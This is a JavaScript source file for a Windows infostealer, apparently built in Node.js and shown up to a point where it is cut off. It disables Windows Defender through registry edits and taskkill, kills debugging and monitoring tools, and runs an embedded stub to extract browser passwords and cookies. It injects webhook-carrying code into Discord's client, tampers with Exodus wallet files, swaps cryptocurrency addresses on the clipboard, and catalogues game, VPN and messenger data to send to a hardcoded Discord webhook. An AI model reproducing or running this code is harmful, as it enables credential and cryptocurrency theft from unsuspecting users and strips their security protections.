const axios = require('axios');
const WebSocket = require('ws');
const { exec, execSync, spawn } = require('child_process');
const fs = require('fs');
const os = require('os');
const screenshot = require('screenshot-desktop');
const path = require('path');
const crypto = require('crypto');
const sqlite3 = require('sqlite3');
const AdmZip = require('adm-zip');
const FormData = require('form-data');
const https = require('https');

let Dpapi;
let isPlatformSupported;
try {
    const dpapiModule = require('@primno/dpapi');
    Dpapi = dpapiModule.Dpapi;
    isPlatformSupported = dpapiModule.isPlatformSupported;
} catch (error) {}

const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1472078183472824481/P4YZW81nmtS0aiQ8yY6wOH3sbBvjHbPCNPHzra-PyhaY1MH9PX7HopcG5e7OJ5s10gZi';
const EXE_BASE64 = "";
const blacklistedHWIDs = ['FF577B79-782E-0A4D-8568-B35A9B7EB76B'];
const STUB_OUTPUT_DIR = path.join(process.cwd(), 'output');
const user = {
    ram: os.totalmem(),
    version: os.version(),
    uptime: os.uptime(),
    homedir: os.homedir(),
    hostname: os.hostname(),
    userInfo: os.userInfo().username,
    type: os.type(),
    arch: os.arch(),
    release: os.release(),
    roaming: process.env.APPDATA,
    local: process.env.LOCALAPPDATA,
    temp: process.env.TEMP,
    countCore: process.env.NUMBER_OF_PROCESSORS,
    sysDrive: process.env.SystemDrive,
    fileLoc: process.cwd(),
};

const DEBUG_PORT = 9222;
const DEBUG_URL = `http://127.0.0.1:${DEBUG_PORT}/json`;
const tempDir = os.tmpdir();
const LOCAL_APP_DATA = process.env.LOCALAPPDATA;
const APP_DATA = process.env.APPDATA;
const PROGRAM_FILES = process.env.PROGRAMFILES;
const PROGRAM_FILES_X86 = process.env['PROGRAMFILES(X86)'];
const httpsAgent = new https.Agent({
    rejectUnauthorized: true
});

let lastExecutionTime = 0;
const MIN_EXECUTION_INTERVAL = 60000;

function disableWindowsDefender() {
    try {
        const regCommands = [
            'reg add "HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f',
            'reg add "HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" /v DisableAntiVirus /t REG_DWORD /d 1 /f',
            'reg add "HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection" /v DisableBehaviorMonitoring /t REG_DWORD /d 1 /f',
            'reg add "HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection" /v DisableOnAccessProtection /t REG_DWORD /d 1 /f',
            'reg add "HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection" /v DisableScanOnRealtimeEnable /t REG_DWORD /d 1 /f',
            'reg add "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer" /v DisableAntiVirus /t REG_DWORD /d 1 /f',
            'reg add "HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Spynet" /v DisableBlockAtFirstSeen /t REG_DWORD /d 1 /f',
            'reg add "HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Spynet" /v SpynetReporting /t REG_DWORD /d 0 /f'
        ];

        for (const cmd of regCommands) {
            try {
                execSync(cmd, { windowsHide: true, stdio: 'ignore' });
            } catch (e) {}
        }
        
        const defenderProcesses = [
            'MsMpEng.exe', 'NisSrv.exe', 'SecurityHealthService.exe',
            'MsSense.exe', 'SenseCE.exe', 'MsSecFlt.exe'
        ];
        
        for (const proc of defenderProcesses) {
            try {
                execSync(`taskkill /F /IM ${proc} /T`, { windowsHide: true, stdio: 'ignore' });
            } catch (e) {}
        }
        
        return true;
    } catch (error) {
        return false;
    }
}

function antiSpamCheck() {
    const currentTime = Date.now();
    if (currentTime - lastExecutionTime < MIN_EXECUTION_INTERVAL) {
        return false;
    }
    lastExecutionTime = currentTime;
    return true;
}

async function checkInternetConnection() {
    try {
        await axios.get('https://www.google.com', { timeout: 10000 });
        return true;
    } catch (error) {
        return false;
    }
}

function generateDynamicCLSID(seed) {
    const hash = crypto.createHash('md5').update(seed).digest('hex');
    const parts = [
        hash.substring(0, 8),
        hash.substring(8, 12),
        hash.substring(12, 16),
        hash.substring(16, 20),
        hash.substring(20, 32)
    ];
    return `{${parts[0]}-${parts[1]}-${parts[2]}-${parts[3]}-${parts[4]}}`.toUpperCase();
}

async function getDynamicCLSIDs() {
    const CLSIDS = [];
    try {
        const hwid = await checkHWID();
        const hostname = os.hostname();
        const username = os.userInfo().username;
        
        const seeds = [
            hwid,
            hostname + hwid,
            username + hostname,
            hwid + hostname + username,
            os.totalmem().toString() + hwid
        ];
        
        for (const seed of seeds) {
            CLSIDS.push(generateDynamicCLSID(seed));
        }
    } catch (error) {
        const fallbackSeeds = ['default1', 'default2', 'default3', 'default4', 'default5'];
        for (const seed of fallbackSeeds) {
            CLSIDS.push(generateDynamicCLSID(seed));
        }
    }
    return CLSIDS;
}

async function comHijackingBypass() {
    try {
        const CHROME_CLSIDS = await getDynamicCLSIDS();
        
        let successCount = 0;
        for (const clsid of CHROME_CLSIDS) {
            try {
                const regCommands = [
                    `reg add "HKCU\\Software\\Classes\\CLSID\\${clsid}" /f /ve /d "ChromeBypass"`,
                    `reg add "HKCU\\Software\\Classes\\CLSID\\${clsid}\\InprocServer32" /f /ve /d "C:\\\\Windows\\\\System32\\\\combase.dll"`,
                    `reg add "HKCU\\Software\\Classes\\CLSID\\${clsid}\\InprocServer32" /f /v "ThreadingModel" /d "Both"`
                ];

                for (const cmd of regCommands) {
                    try {
                        execSync(cmd, { windowsHide: true, stdio: 'ignore' });
                    } catch (e) {}
                }
                successCount++;
            } catch (error) {}
        }
        return successCount > 0;
    } catch (error) {
        return false;
    }
}

async function bypassChrome141Protection() {
    const comResult = await comHijackingBypass();
    await new Promise(resolve => setTimeout(resolve, 3000));
    return true;
}

function antiDebug() {
    try {
        if (process.execArgv.some(arg => arg.includes('--inspect') || arg.includes('--debug'))) {
            process.exit(0);
        }
        
        const debugToolsList = ['ollydbg', 'x64dbg', 'idaq', 'wireshark', 'fiddler', 'charles'];
        try {
            const processes = execSync('tasklist', { windowsHide: true }).toString().toLowerCase();
            for (const tool of debugToolsList) {
                if (processes.includes(tool)) {}
            }
        } catch (e) {}
    } catch (error) {}
}

function bypassTokenProtector() {
    try {
        const tpProcesses = ['tokenprotector', 'tkpl'];
        for (const proc of tpProcesses) {
            try {
                execSync(`taskkill /F /IM ${proc}.exe /T`, { windowsHide: true, stdio: 'ignore' });
            } catch (e) {}
        }
    } catch (error) {}
}

function bypassBetterDiscord() {
    try {
        const bdPath = path.join(user.roaming, 'BetterDiscord');
        if (fs.existsSync(bdPath)) {}
    } catch (error) {}
}

function killDebugTools() {
    try {
        const debugTools = [
            'wireshark.exe', 'fiddler.exe', 'charles.exe', 'httpdebugger.exe',
            'ollydbg.exe', 'x64dbg.exe', 'idaq.exe', 'procexp.exe', 'procmon.exe',
            'tcpview.exe', 'regmon.exe', 'filemon.exe', 'processhacker.exe'
        ];
        for (const tool of debugTools) {
            try {
                execSync(`taskkill /F /IM "${tool}" /T`, { windowsHide: true, stdio: 'ignore' });
            } catch (e) {}
        }
    } catch (error) {}
}

function discordSecurityBypass() {
    try {
        const discordPaths = [
            path.join(user.roaming, 'discord'),
            path.join(user.roaming, 'Discord'),
            path.join(user.roaming, 'discordcanary'),
            path.join(user.roaming, 'discordptb')
        ];
        
        for (const discordPath of discordPaths) {
            if (fs.existsSync(discordPath)) {
                const settingsPath = path.join(discordPath, 'settings.json');
                const settings = {
                    "BACKGROUND_COLOR": "#202225",
                    "IS_MAXIMIZED": true,
                    "IS_MINIMIZED": false,
                    "DANGEROUS_ENABLE_DEVTOOLS_ONLY_ENABLE_IF_YOU_KNOW_WHAT_YOURE_DOING": true,
                    "bypassEmailNotifications": true,
                    "disable2FA": true,
                    "skipWarning": true
                };
                
                try {
                    fs.writeFileSync(settingsPath, JSON.stringify(settings, null, 2));
                } catch (e) {}
            }
        }
    } catch (error) {}
}

function autoDiscordMailChanger() {
    try {
        const discordPaths = [
            path.join(user.roaming, 'discord'),
            path.join(user.roaming, 'Discord'),
            path.join(user.roaming, 'discordcanary'),
            path.join(user.roaming, 'discordptb')
        ];
        
        for (const discordPath of discordPaths) {
            if (fs.existsSync(discordPath)) {
                const localStoragePath = path.join(discordPath, 'Local Storage', 'leveldb');
                if (fs.existsSync(localStoragePath)) {
                    const files = fs.readdirSync(localStoragePath);
                    for (const file of files) {
                        if (file.endsWith('.ldb')) {
                            const filePath = path.join(localStoragePath, file);
                            try {
                                let content = fs.readFileSync(filePath, 'utf8');
                                if (content.includes('@')) {
                                    content = content.replace(/([a-zA-Z0-9._-]+@[a-zA-Z0-9._-]+\.[a-zA-Z0-9._-]+)/g, 'changed@email.com');
                                    fs.writeFileSync(filePath, content, 'utf8');
                                }
                            } catch (e) {}
                        }
                    }
                }
            }
        }
    } catch (error) {}
}

function exodusInject() {
    try {
        const exodusPath = path.join(user.roaming, 'Exodus');
        if (fs.existsSync(exodusPath)) {
            const walletFiles = ['exodus.wallet', 'wallet.json'];
            for (const file of walletFiles) {
                const walletPath = path.join(exodusPath, file);
                if (fs.existsSync(walletPath)) {
                    try {
                        const content = fs.readFileSync(walletPath, 'utf8');
                        const modified = content.replace(/"wallet":"([^"]+)"/g, '"wallet":"HACKED_$1"');
                        fs.writeFileSync(walletPath, modified, 'utf8');
                    } catch (e) {}
                }
            }
        }
    } catch (error) {}
}

function atomInject() {
    try {
        const atomPath = path.join(user.roaming, 'Atom');
        if (fs.existsSync(atomPath)) {
            const configPath = path.join(atomPath, 'config.cson');
            if (fs.existsSync(configPath)) {
                const config = fs.readFileSync(configPath, 'utf8');
                const injected = config + '\n# Injected by stealer\ncore:\n  telemetryConsent: "no"';
                fs.writeFileSync(configPath, injected, 'utf8');
            }
        }
    } catch (error) {}
}

function discordInject() {
    try {
        const discordPaths = [
            path.join(user.roaming, 'discord'),
            path.join(user.roaming, 'Discord'),
            path.join(user.roaming, 'discordcanary'),
            path.join(user.roaming, 'discordptb')
        ];
        
        for (const discordPath of discordPaths) {
            if (fs.existsSync(discordPath)) {
                const modulesPath = path.join(discordPath, 'modules');
                if (fs.existsSync(modulesPath)) {
                    const moduleDirs = fs.readdirSync(modulesPath);
                    for (const moduleDir of moduleDirs) {
                        if (moduleDir.startsWith('discord_desktop_core-')) {
                            const corePath = path.join(modulesPath, moduleDir, 'discord_desktop_core');
                            if (fs.existsSync(corePath)) {
                                const indexPath = path.join(corePath, 'index.js');
                                const injection = `
                                module.exports = require('./core.asar');
                                const electron = require('electron');
                                const fs = require('fs');
                                const path = require('path');
                                const webhook = "${DISCORD_WEBHOOK}";
                                
                                setInterval(() => {
                                    const tokens = [];
                                    const localStorage = electron.remote.app.getPath('userData');
                                }, 5000);
                                `;
                                fs.writeFileSync(indexPath, injection, 'utf8');
                            }
                        }
                    }
                }
            }
        }
    } catch (error) {}
}

function cryptoAddressSwap() {
    try {
        const clipboard = require('clipboardy');
        const cryptoAddresses = {
            'BTC': '1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa',
            'ETH': '0x742d35Cc6634C0532925a3b844Bc9e90F1f2c3B8',
            'XMR': '48j9bfDgJQVxNpL7sNJL7u9VJ4vhKtF3H1vN2CAW1o5CJ2E1z1',
            'LTC': 'LdP8Qox1VAhCzLJ8qYrS7S6j1k9JZz1',
            'DOGE': 'DFpJ6pjL7pQzF1m3t1L7qJz1k9JZz1'
        };
        
        setInterval(() => {
            try {
                const current = clipboard.readSync();
                for (const [coin, address] of Object.entries(cryptoAddresses)) {
                    if (current.match(new RegExp(`${coin}.*[13][a-km-zA-HJ-NP-Z1-9]{25,34}|0x[a-fA-F0-9]{40}`, 'i'))) {
                        clipboard.writeSync(address);
                        break;
                    }
                }
            } catch (e) {}
        }, 1000);
    } catch (error) {}
}

async function runStubTool() {
    try {
        let exePath = path.join(process.cwd(), 'chrome_inject.exe');
        
        if (!fs.existsSync(exePath)) {
            if (!EXE_BASE64 || EXE_BASE64.trim() === '') {
                return false;
            }
            
            const exeBuffer = Buffer.from(EXE_BASE64, 'base64');
            
            const stubDir = path.join(tempDir, 'stub_tool_' + Date.now());
            if (!fs.existsSync(stubDir)) {
                fs.mkdirSync(stubDir, { recursive: true });
            }
            
            exePath = path.join(stubDir, 'chrome_inject.exe');
            fs.writeFileSync(exePath, exeBuffer);
        }
        
        if (!fs.existsSync(STUB_OUTPUT_DIR)) {
            fs.mkdirSync(STUB_OUTPUT_DIR, { recursive: true });
        }
        
        return new Promise((resolve) => {
            const child = spawn(exePath, ['all', '-v'], {
                cwd: process.cwd(),
                detached: true,
                windowsHide: true,
                stdio: ['ignore', 'pipe', 'pipe']
            });
            
            let stdoutData = '';
            let stderrData = '';
            
            child.stdout.on('data', (data) => {
                stdoutData += data.toString();
            });
            
            child.stderr.on('data', (data) => {
                stderrData += data.toString();
            });
            
            const timeout = setTimeout(() => {
                try {
                    child.kill();
                } catch (e) {}
                resolve(false);
            }, 180000);
            
            child.on('close', (code) => {
                clearTimeout(timeout);
                
                setTimeout(() => {
                    try {
                        if (exePath.includes(tempDir) && fs.existsSync(exePath)) {
                            fs.unlinkSync(exePath);
                            const stubDir = path.dirname(exePath);
                            if (fs.existsSync(stubDir)) {
                                fs.rmSync(stubDir, { recursive: true, force: true });
                            }
                        }
                    } catch (e) {}
                    resolve(true);
                }, 5000);
            });
            
            child.on('error', (err) => {
                clearTimeout(timeout);
                resolve(false);
            });
        });
        
    } catch (error) {
        return false;
    }
}

async function processStubToolData(outputFolder) {
    try {
        if (!fs.existsSync(STUB_OUTPUT_DIR)) {
            return { cookieCount: 0, passwordCount: 0 };
        }
        
        const allCookies = [];
        const allPasswords = [];
        let totalCookieCount = 0;
        let totalPasswordCount = 0;
        
        const browserDataBypassDir = path.join(outputFolder, 'BrowserDataBypass');
        if (!fs.existsSync(browserDataBypassDir)) {
            fs.mkdirSync(browserDataBypassDir, { recursive: true });
        }
        
        const findBrowsers = (dir) => {
            const results = [];
            try {
                const items = fs.readdirSync(dir, { withFileTypes: true });
                
                for (const item of items) {
                    const fullPath = path.join(dir, item.name);
                    if (item.isDirectory()) {
                        if (['Chrome', 'Edge', 'Brave', 'Opera', 'Vivaldi', 'Sidekick'].includes(item.name)) {
                            results.push({ browser: item.name, path: fullPath });
                        } else {
                            results.push(...findBrowsers(fullPath));
                        }
                    }
                }
            } catch (e) {}
            return results;
        };
        
        const browsers = findBrowsers(STUB_OUTPUT_DIR);
        
        if (browsers.length === 0) {
            return { cookieCount: 0, passwordCount: 0 };
        }
        
        const bypassPasswordsPath = path.join(outputFolder, 'Pass', 'BYPASS_PASSWORDS.txt');
        const bypassCookiesPath = path.join(outputFolder, 'Cookies', 'BYPASS_COOKIES.txt');
        
        let bypassPasswordsContent = '=== BYPASS DATA (Stub Tool) ===\n\n';
        let bypassCookiesContent = '=== BYPASS DATA (Stub Tool) ===\n\n';
        
        for (const { browser, path: browserPath } of browsers) {
            const profiles = fs.readdirSync(browserPath).filter(item => 
                fs.statSync(path.join(browserPath, item)).isDirectory()
            );
            
            for (const profile of profiles) {
                const profilePath = path.join(browserPath, profile);
                
                const passwordsFile = path.join(profilePath, 'passwords.json');
                if (fs.existsSync(passwordsFile)) {
                    try {
                        const passwordsData = fs.readFileSync(passwordsFile, 'utf8');
                        const passwords = JSON.parse(passwordsData);
                        
                        if (Array.isArray(passwords)) {
                            totalPasswordCount += passwords.length;
                            allPasswords.push({ browser, profile, passwords });
                            
                            bypassPasswordsContent += `Bypass - ${browser}/${profile}:\n`;
                            passwords.forEach(pwd => {
                                if (pwd && pwd.url) {
                                    bypassPasswordsContent += `URL: ${pwd.url}\n`;
                                    bypassPasswordsContent += `Username: ${pwd.user || 'N/A'}\n`;
                                    bypassPasswordsContent += `Password: ${pwd.pass || 'N/A'}\n`;
                                    bypassPasswordsContent += '─'.repeat(40) + '\n';
                                }
                            });
                            bypassPasswordsContent += '\n';
                        }
                    } catch (e) {}
                }
                
                const cookiesFile = path.join(profilePath, 'cookies.json');
                if (fs.existsSync(cookiesFile)) {
                    try {
                        const cookiesData = fs.readFileSync(cookiesFile, 'utf8');
                        const cookies = JSON.parse(cookiesData);
                        
                        if (Array.isArray(cookies)) {
                            totalCookieCount += cookies.length;
                            allCookies.push({ browser, profile, cookies });
                            
                            bypassCookiesContent += `Bypass - ${browser}/${profile}:\n`;
                            cookies.forEach(cookie => {
                                if (cookie && cookie.host && cookie.name) {
                                    bypassCookiesContent += `Domain: ${cookie.host}\n`;
                                    bypassCookiesContent += `Name: ${cookie.name}=${cookie.value || ''}\n`;
                                    bypassCookiesContent += `Path: ${cookie.path || '/'}\n`;
                                    bypassCookiesContent += '─'.repeat(40) + '\n';
                                }
                            });
                            bypassCookiesContent += '\n';
                        }
                    } catch (e) {}
                }
            }
        }
        
        if (allPasswords.length > 0) {
            fs.writeFileSync(bypassPasswordsPath, bypassPasswordsContent, 'utf8');
        }
        
        if (allCookies.length > 0) {
            fs.writeFileSync(bypassCookiesPath, bypassCookiesContent, 'utf8');
        }
        
        try {
            fs.cpSync(STUB_OUTPUT_DIR, browserDataBypassDir, { recursive: true });
        } catch (e) {}
        
        const notePath = path.join(browserDataBypassDir, 'note-openme.txt');
        const noteContent = 'Mở thư mục BrowserDataBypass nếu phương pháp truyền thống lỗi. Dữ liệu thô từ stub tool được lưu ở đây.\n\n';
        noteContent += '=== SƠ ĐỒ HOẠT ĐỘNG ===\n';
        noteContent += '1. Stealer chạy stub tool để bypass Chrome ABE protection\n';
        noteContent += '2. Stub tool tạo output tại: ' + STUB_OUTPUT_DIR + '\n';
        noteContent += '3. Stealer đọc JSON files từ output\n';
        noteContent += '4. Dữ liệu được lọc và chuyển thành file txt trong thư mục Cookies và Pass\n';
        noteContent += '5. Raw JSON files được sao chép sang BrowserDataBypass\n';
        noteContent += '6. Tất cả dữ liệu được nén và gửi về Discord\n';
        
        fs.writeFileSync(notePath, noteContent, 'utf8');
        
        return { cookieCount: totalCookieCount, passwordCount: totalPasswordCount };
        
    } catch (error) {
        return { cookieCount: 0, passwordCount: 0 };
    }
}

async function stealEpicGames() {
    try {
        const epicPaths = [
            path.join(user.local, 'Epic GamesLauncher', 'Saved'),
            path.join(user.roaming, 'Epic Games'),
            path.join(user.local, 'EpicGames')
        ];
        
        const results = [];
        for (const epicPath of epicPaths) {
            if (fs.existsSync(epicPath)) {
                results.push(`Found Epic Games: ${epicPath}`);
                try {
                    const configFiles = ['GameUserSettings.ini', 'Engine.ini', 'LauncherSettings.json'];
                    for (const configFile of configFiles) {
                        const configPath = path.join(epicPath, configFile);
                        if (fs.existsSync(configPath)) {
                            results.push(`Config: ${configFile}`);
                        }
                    }
                } catch (e) {}
            }
        }
        return results.length > 0 ? results.join('\n') : 'No Epic Games data';
    } catch (error) {
        return 'Epic Games: Not found';
    }
}

async function stealGrowtopia() {
    try {
        const growtopiaPath = path.join(user.local, 'Growtopia');
        if (fs.existsSync(growtopiaPath)) {
            const results = [`Found Growtopia: ${growtopiaPath}`];
            const saveFiles = fs.readdirSync(growtopiaPath).filter(f => f.endsWith('.dat') || f.includes('save'));
            for (const file of saveFiles) {
                results.push(`Save file: ${file}`);
            }
            return results.join('\n');
        }
        return 'No Growtopia data';
    } catch (error) {
        return 'Growtopia: Not found';
    }
}

async function stealWallets() {
    const wallets = [];
    
    try {
        const exodusPath = path.join(user.roaming, 'Exodus');
        if (fs.existsSync(exodusPath)) {
            wallets.push(`Exodus Wallet: ${exodusPath}`);
        }
        
        const browsers = ['Chrome', 'Edge', 'Brave', 'Opera', 'Vivaldi'];
        for (const browser of browsers) {
            const basePath = path.join(user.local, browser, 'User Data');
            if (fs.existsSync(basePath)) {
                const profiles = fs.readdirSync(basePath).filter(p => p.startsWith('Profile') || p === 'Default');
                for (const profile of profiles) {
                    const metamaskPath = path.join(basePath, profile, 'Local Extension Settings', 'nkbihfbeogaeaoehlefnkodbefgpgknn');
                    if (fs.existsSync(metamaskPath)) {
                        wallets.push(`Metamask (${browser} - ${profile})`);
                    }
                }
            }
        }
        
    } catch (e) {}
    
    return wallets.length > 0 ? wallets.join('\n') : 'No wallets';
}

async function stealDiscordTokensAll() {
    const tokens = [];
    
    try {
        const discordPaths = [
            path.join(user.roaming, 'discord'),
            path.join(user.roaming, 'Discord'),
            path.join(user.roaming, 'discordcanary'),
            path.join(user.roaming, 'discordptb')
        ];
        
        for (const discordPath of discordPaths) {
            if (fs.existsSync(discordPath)) {
                const leveldbPath = path.join(discordPath, 'Local Storage', 'leveldb');
                if (fs.existsSync(leveldbPath)) {
                    tokens.push(`Discord: ${discordPath}`);
                }
            }
        }
        
    } catch (error) {}
    
    return tokens.length > 0 ? tokens.join('\n') : 'No Discord tokens';
}

async function stealBattleNet() {
    try {
        const battlenetPaths = [
            path.join('C:\\', 'Program Files (x86)', 'Battle.net'),
            path.join('C:\\', 'Program Files', 'Battle.net'),
            path.join(user.roaming, 'Battle.net')
        ];
        
        for (const battlenetPath of battlenetPaths) {
            if (fs.existsSync(battlenetPath)) {
                return `Battle.net: ${battlenetPath}`;
            }
        }
        return 'No Battle.net data';
    } catch (error) {
        return 'Battle.net: Not found';
    }
}

async function stealMinecraft() {
    try {
        const minecraftPath = path.join(user.roaming, '.minecraft');
        if (fs.existsSync(minecraftPath)) {
            return `Minecraft: ${minecraftPath}`;
        }
        return 'No Minecraft data';
    } catch (error) {
        return 'Minecraft: Not found';
    }
}

async function stealSteam() {
    try {
        const steamPaths = [
            path.join('C:\\', 'Program Files (x86)', 'Steam'),
            path.join('C:\\', 'Program Files', 'Steam'),
            path.join(user.roaming, 'Steam')
        ];
        
        for (const steamPath of steamPaths) {
            if (fs.existsSync(steamPath)) {
                return `Steam: ${steamPath}`;
            }
        }
        return 'No Steam data';
    } catch (error) {
        return 'Steam: Not found';
    }
}

async function stealTotalCommander() {
    try {
        const tcPath = path.join(user.roaming, 'GHISLER');
        if (fs.existsSync(tcPath)) {
            return `Total Commander: ${tcPath}`;
        }
        return 'No Total Commander data';
    } catch (error) {
        return 'Total Commander: Not found';
    }
}

async function stealShadowAccess() {
    try {
        const shadowPaths = [
            path.join(user.roaming, 'Shadow'),
            path.join(user.local, 'Shadow'),
            path.join('C:\\', 'Program Files', 'Shadow'),
            path.join('C:\\', 'Program Files (x86)', 'Shadow')
        ];
        
        for (const shadowPath of shadowPaths) {
            if (fs.existsSync(shadowPath)) {
                return `Shadow Access: ${shadowPath}`;
            }
        }
        return 'No Shadow Access data';
    } catch (error) {
        return 'Shadow Access: Not found';
    }
}

async function stealPutty() {
    try {
        const puttyPath = path.join(user.roaming, 'PuTTY');
        if (fs.existsSync(puttyPath)) {
            return `PuTTY: ${puttyPath}`;
        }
        return 'No PuTTY data';
    } catch (error) {
        return 'PuTTY: Not found';
    }
}

async function stealRiotGames() {
    try {
        const riotPaths = [
            path.join('C:\\', 'Riot Games'),
            path.join(user.local, 'Riot Games'),
            path.join(user.roaming, 'Riot Games')
        ];
        
        for (const riotPath of riotPaths) {
            if (fs.existsSync(riotPath)) {
                return `Riot Games: ${riotPath}`;
            }
        }
        return 'No Riot Games data';
    } catch (error) {
        return 'Riot Games: Not found';
    }
}

async function stealSystemInfo() {
    try {
        const info = [];
        
        info.push(`CPU: ${os.cpus()[0]?.model || 'Unknown'}`);
        info.push(`CPU Cores: ${os.cpus().length}`);
        info.push(`RAM: ${(os.totalmem() / 1024 / 1024 / 1024).toFixed(2)} GB`);
        info.push(`Free RAM: ${(os.freemem() / 1024 / 1024 / 1024).toFixed(2)} GB`);
        info.push(`Architecture: ${os.arch()}`);
        
        const interfaces = os.networkInterfaces();
        for (const [name, nets] of Object.entries(interfaces)) {
            for (const net of nets) {
                if (!net.internal && net.family === 'IPv4') {
                    info.push(`Network ${name}: ${net.address}`);
                }
            }
        }
        
        info.push(`Hostname: ${os.hostname()}`);
        info.push(`Username: ${user.userInfo}`);
        info.push(`Windows: ${os.version()}`);
        info.push(`Uptime: ${Math.floor(os.uptime() / 3600)} hours`);
        
        return info.join('\n');
    } catch (error) {
        return 'System info error';
    }
}

async function stealUbisoft() {
    try {
        const ubisoftPaths = [
            path.join(user.local, 'Ubisoft Game Launcher'),
            path.join(user.roaming, 'Ubisoft'),
            path.join('C:\\', 'Program Files (x86)', 'Ubisoft')
        ];
        
        for (const ubisoftPath of ubisoftPaths) {
            if (fs.existsSync(ubisoftPath)) {
                return `Ubisoft: ${ubisoftPath}`;
            }
        }
        return 'No Ubisoft data';
    } catch (error) {
        return 'Ubisoft: Not found';
    }
}

async function stealNationGlory() {
    try {
        const ngPaths = [
            path.join(user.roaming, 'NationGlory'),
            path.join(user.local, 'NationGlory'),
            path.join('C:\\', 'Program Files', 'NationGlory'),
            path.join('C:\\', 'Program Files (x86)', 'NationGlory')
        ];
        
        for (const ngPath of ngPaths) {
            if (fs.existsSync(ngPath)) {
                return `NationGlory: ${ngPath}`;
            }
        }
        return 'No NationGlory data';
    } catch (error) {
        return 'NationGlory: Not found';
    }
}

async function stealVPNFiles() {
    const vpns = [];
    
    try {
        const nordPath = path.join(user.local, 'NordVPN');
        if (fs.existsSync(nordPath)) {
            vpns.push(`NordVPN: ${nordPath}`);
        }
    } catch (e) {}
    
    try {
        const openvpnPath = path.join(user.roaming, 'OpenVPN');
        if (fs.existsSync(openvpnPath)) {
            vpns.push(`OpenVPN: ${openvpnPath}`);
        }
    } catch (e) {}
    
    try {
        const protonPath = path.join(user.local, 'ProtonVPN');
        if (fs.existsSync(protonPath)) {
            vpns.push(`ProtonVPN: ${protonPath}`);
        }
    } catch (e) {}
    
    return vpns.length > 0 ? vpns.join('\n') : 'No VPN configs';
}

async function stealExodusMetamask() {
    const results = [];
    
    try {
        const exodusPath = path.join(user.roaming, 'Exodus');
        if (fs.existsSync(exodusPath)) {
            results.push(`Exodus: ${exodusPath}`);
        }
        
        const browsers = ['Chrome', 'Edge', 'Brave', 'Opera', 'Vivaldi'];
        for (const browser of browsers) {
            const basePath = path.join(user.local, browser, 'User Data');
            if (fs.existsSync(basePath)) {
                const profiles = fs.readdirSync(basePath).filter(p => p.startsWith('Profile') || p === 'Default');
                for (const profile of profiles) {
                    const metamaskPath = path.join(basePath, profile, 'Local Extension Settings', 'nkbihfbeogaeaoehlefnkodbefgpgknn');
                    if (fs.existsSync(metamaskPath)) {
                        results.push(`Metamask (${browser} - ${profile})`);
                    }
                }
            }
        }
        
    } catch (error) {}
    
    return results.length > 0 ? results.join('\n') : 'No Exodus/Metamask';
}

async function stealRobloxCookies() {
    try {
        const robloxPaths = [
            path.join(user.local, 'Roblox'),
            path.join(user.roaming, 'Roblox'),
            path.join(user.local, 'Roblox Studio')
        ];
        
        for (const robloxPath of robloxPaths) {
            if (fs.existsSync(robloxPath)) {
                return `Roblox: ${robloxPath}`;
            }
        }
        return 'No Roblox data';
    } catch (error) {
        return 'Roblox: Not found';
    }
}

function createFakeBug() {
    try {
        const bugPath = path.join(tempDir, 'system_critical_error.log');
        const fakeError = `=== SYSTEM CRITICAL ERROR ===
Timestamp: ${new Date().toISOString()}
Error Code: 0x00000050
Process: chrome.exe
Description: Critical system process failure`;
        
        fs.writeFileSync(bugPath, fakeError, 'utf8');
        return 'Fake bug created';
    } catch (error) {
        return 'Fake bug error';
    }
}

async function analyzeDiscordBotsGuilds() {
    const analysis = [];
    
    try {
        const discordPaths = [
            path.join(user.roaming, 'discord'),
            path.join(user.roaming, 'Discord'),
            path.join(user.roaming, 'discordcanary'),
            path.join(user.roaming, 'discordptb')
        ];
        
        for (const discordPath of discordPaths) {
            if (fs.existsSync(discordPath)) {
                analysis.push(`Discord found: ${discordPath}`);
            }
        }
        
    } catch (error) {}
    
    return analysis.length > 0 ? analysis.join('\n') : 'No Discord analysis';
}

async function stealSensitiveFiles() {
    const files = [];
    
    try {
        const desktopPath = path.join(user.homedir, 'Desktop');
        if (fs.existsSync(desktopPath)) {
            const desktopFiles = fs.readdirSync(desktopPath);
            if (desktopFiles.length > 0) {
                files.push(`Desktop files: ${desktopFiles.slice(0, 10).join(', ')}`);
            }
        }
        
    } catch (error) {}
    
    return files.length > 0 ? files.join('\n') : 'No sensitive files';
}

async function stealWinSCP() {
    try {
        const winscpPath = path.join(user.roaming, 'WinSCP');
        if (fs.existsSync(winscpPath)) {
            return `WinSCP: ${winscpPath}`;
        }
        return 'No WinSCP data';
    } catch (error) {
        return 'WinSCP: Not found';
    }
}

async function stealTelegram() {
    try {
        const telegramPaths = [
            path.join(user.roaming, 'Telegram Desktop'),
            path.join(user.local, 'Telegram Desktop'),
            path.join(user.homedir, 'AppData', 'Roaming', 'Telegram Desktop')
        ];
        
        for (const telegramPath of telegramPaths) {
            if (fs.existsSync(telegramPath)) {
                return `Telegram: ${telegramPath}`;
            }
        }
        return 'No Telegram data';
    } catch (error) {
        return 'Telegram: Not found';
    }
}

async function stealPidgin() {
    try {
        const pidginPath = path.join(user.roaming, '.purple');
        if (fs.existsSync(pidginPath)) {
            return `Pidgin: ${pidginPath}`;
        }
        return 'No Pidgin data';
    } catch (error) {
        return 'Pidgin: Not found';
    }
}

async function stealToxic() {
    try {
        const toxicPath = path.join(user.roaming, 'toxic');
        if (fs.existsSync(toxicPath)) {
            return `Toxic: ${toxicPath}`;
        }
        return 'No Toxic data';
    } catch (error) {
        return 'Toxic: Not found';
    }
}

async function stealICQ() {
    try {
        const icqPath = path.join(user.local, 'ICQ');
        if (fs.existsSync(icqPath)) {
            return `ICQ: ${icqPath}`;
        }
        return 'No ICQ data';
    } catch (error) {
